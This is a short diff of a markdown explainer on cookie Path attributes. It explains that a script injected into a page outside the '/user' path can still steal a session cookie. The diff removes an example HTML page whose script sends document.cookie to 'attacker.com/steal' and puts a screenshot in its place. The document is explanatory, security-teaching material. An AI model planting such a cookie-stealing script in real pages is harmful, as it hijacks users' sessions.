@@ -142,25 +142,12 @@
 
    **Set-Cookie: sessionId=123; Path=/user*
    
-In this case, a script is injected by an attacker into the insecure.html page on the same domain, but it is not located inside the "/user" path. The injected script steal the user's session cookie to a domain under the control of the attacker.
+   In this case, a script is injected by an attacker into the insecure.html page on the same domain, but it is not located inside the 
+   "/user" path. The injected script steal the user's session cookie to a domain under the control of the attacker.
 
-*Insecure html page
+ * Insecure html page
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Insecure Page</title>
-</head>
-<body>
-    <h1>Welcome to our website!</h1>
-    <script>
-        // Simulating a malicious script injected by an attacker
-        const img = new Image();
-        img.src = "https://attacker.com/steal?cookie=" + document.cookie;
-    </script>
-</body>
-</html>
+<kbd><img src="screenshots/insecure_html.png" width="700" ></kbd>
 
  * Example futher explained.
 
